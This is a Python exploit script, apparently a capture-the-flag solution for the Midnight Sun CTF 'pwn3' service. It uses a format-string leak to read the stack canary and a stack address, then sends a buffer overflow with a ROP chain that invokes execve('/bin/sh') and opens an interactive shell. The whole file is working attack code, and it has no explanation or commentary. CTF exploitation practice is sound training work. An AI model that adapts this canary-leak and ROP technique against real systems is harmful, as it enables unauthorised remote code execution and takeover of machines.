#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

# context.log_level = 'debug'

#==========

mode    = 'SOCKET'
target  = {'host':'pwn3.midnightsunctf.se', 'port':31337}

addr_pop_cbb = 0x08048996
addr_pop_adb = 0x08055244
addr_syscall = 0x0806e5ec

#==========

def attack(conn):
    conn.sendlineafter('name? ', '%279$p %282$p ')
    conn.recvuntil('Hello ')
    canary          = int(conn.recvuntil(' ', drop=True), 16)
    addr_stack_base = int(conn.recvuntil(' ', drop=True), 16) - 0x10
    addr_stack_buf  = addr_stack_base - 0x40c
    info('canary            = 0x{:08x}'.format(canary))
    info('addr_stack_base   = 0x{:08x}'.format(addr_stack_base))

    exploit  = '/bin/sh\x00'
    exploit += p32(addr_syscall)
    exploit += p32(addr_stack_buf)
    exploit += p32(0)
    exploit  = exploit.ljust(0x400)
    exploit += p32(canary)
    exploit += 'b'*8
    exploit += p32(0xdeadbeef)
    exploit += p32(addr_pop_adb)
    exploit += p32(0x0b)
    exploit += p32(0)
    exploit += p32(0xdeadbeef)
    exploit += p32(addr_pop_cbb)
    exploit += p32(addr_stack_buf + 0xc)
    exploit += p32(addr_stack_buf)
    exploit += p32(0xdeadbeef)
    conn.sendlineafter('today? ', exploit)

#==========

if __name__=='__main__':
    conn = communicate(mode, **target)
    attack(conn)
    conn.interactive()
   
#==========
